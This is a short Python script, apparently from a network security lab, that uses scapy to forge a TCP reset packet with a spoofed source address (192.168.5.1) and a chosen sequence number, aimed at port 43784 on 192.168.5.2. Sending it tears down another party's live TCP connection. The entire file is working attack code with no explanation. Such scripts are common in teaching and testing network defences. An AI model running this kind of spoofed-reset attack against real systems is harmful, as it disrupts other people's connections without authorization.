#!/usr/bin/python3

import sys
from scapy.all import *

print("SENDING RESET PACKET......")

IPLayer = IP(src="192.168.5.1", dst="192.168.5.2")
TCPLayer = TCP(sport=9090, dport=43784, flags="R", seq=3192499006)
pkt = IPLayer/TCPLayer

send(pkt, verbose=0)
